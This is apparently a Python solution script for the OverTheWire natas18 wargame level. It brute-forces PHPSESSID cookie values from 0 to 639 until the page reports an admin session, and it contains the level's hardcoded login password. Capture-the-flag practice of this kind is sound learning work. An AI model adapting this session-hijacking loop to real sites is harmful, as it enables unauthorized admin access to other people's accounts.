#! /usr/bin/env python3
import requests

baseUrl = 'http://natas18.natas.labs.overthewire.org/index.php'
for i in range(0, 640):
    print('Current i='+str(i))
    r = requests.get(baseUrl, auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), cookies={'PHPSESSID':str(i)})
    if 'You are an admin' in r.text:
        print('admin found for i='+str(i))
        break;
